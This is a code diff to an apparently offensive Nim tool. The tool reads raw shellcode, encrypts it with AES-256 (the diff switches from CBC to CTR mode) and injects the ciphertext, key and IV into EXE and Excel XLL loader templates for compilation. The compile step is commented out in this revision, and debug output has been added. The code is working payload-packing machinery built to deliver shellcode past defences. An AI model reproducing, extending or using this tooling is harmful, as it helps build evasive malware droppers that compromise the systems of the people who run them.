@@ -54,15 +54,12 @@ proc aesencrypt(): void =
     
     ## Nim's way API using openArray[byte].
 
-    var ectx: CBC[aes256]
+    var ectx: CTR[aes256]
 
     scArray = shellcode.toByteSeq
-    #var plainText: array[aes256.sizeBlock * 2, byte]
-    #encSC: seq[byte] = newSeq[byte](len(scArray))
 
-    while scArray.len mod 16 != 0:
-        scArray.insert(0x90, 1)
-    #copyMem(addr plainText[0], addr scArray[0], len(scArray))
+    echo "\nscArray inside aesencrypt: ", toHex(scArray)
+    encSC = newSeq[byte](len(scArray))
 
     randomize()
     const asciiRange = 32..126
@@ -87,25 +84,26 @@ proc generatePayload(): void =
         compileCmd: string
     # Read raw shellcode file
     try:
-        file = readFile(shellcodeFilePath)
+        shellcode = readFile(shellcodeFilePath)
+        echo "shellcode = ", toHex(shellcode)
     except IOError as err:
         echo "[-] Error: Could not open file!"
         quit(1)
 
     # Encode/Encrypt bytes
-    let b64shellcode = encode(file)
-    
+    #let b64shellcode = encode(file)
+    aesencrypt()
     # Add base64 shellcode to template
     case fileType:
         of "exe":
             templatePath = "templates/simpleexe.nim"
-            var templateFile = templatePath.readFile()
-            var tempFile = "temp_simpleexe.nim"
+            templateFile = templatePath.readFile()
+            tempFile = "temp_simpleexe.nim"
             compileCmd = compileExe
         of "xll":
             templatePath = "templates/simplexll.nim"
-            var templateFile = templatePath.readFile()
-            var tempFile = "temp_simplexll.nim"
+            templateFile = templatePath.readFile()
+            tempFile = "temp_simplexll.nim"
             if architecture == "x64":
                 compileCmd = compileXll64
             else:
@@ -113,21 +111,41 @@ proc generatePayload(): void =
         else:
             echo "Error: filetype argument must be dll, xll, or cpl!"
             quit(1)
+
     let placeholder = "REPLACE_ME"
-    let replacement =  encode(encSC)
-    echo "[*] Encrypting shellcode using AES-256 CBC!"
-    templateFile = templateFile.replace(placeholder, replacement)
-    tempFile.writeFile(templateFile)
+    echo "scArray = ", scArray
+    echo "\n"
+    echo "encSC = ", encSC
 
-    let origPass = "BLANK_PASSWORD"  
-    echo "[*] Encrypting shellcode using AES-256 CBC!"
-    templateFile = templateFile.replace(origPass, toHex(shaKey.data))
-    tempFile.writeFile(templateFile)
+    let replacement =  toHex(encSC)
+    try:
+        echo "[*] Encrypting shellcode using AES-256 CTR!"
+        templateFile = templateFile.replace(placeholder, replacement)
+        tempFile.writeFile(templateFile)
+    except:
+        echo "[-] Error: Cannot add encrypted shellcode to template file!"
+        quit(1)
+    let origPass = "BLANK_PASSWORD"
+    try:
+        echo "[*] Adding AES key to template file!"
+        templateFile = templateFile.replace(origPass, toHex(shaKey.data))
+        tempFile.writeFile(templateFile)
+    except:
+        echo "[-] Error: Cannot add AES key to template file!"
+        quit(1)
+    let origIV = "BLANK_IV"
+    try:
+        echo "[*] Adding AES IV to template file!"
+        templateFile = templateFile.replace(origIV, toHex(iv))
+        tempFile.writeFile(templateFile)
+    except:
+        echo "[-] Error: Cannot add AES IV to template file!"
+        quit(1)
 
-    let compileResults = execCmdEx(compileCmd)
-    tempFile.removeFile
-    if verbosity == "verbose":
-        echo compileResults.output
+    #let compileResults = execCmdEx(compileCmd)
+    #tempFile.removeFile
+    #if verbosity == "verbose":
+     #   echo compileResults.output
 
 when isMainModule:
     if pCount >= 2:
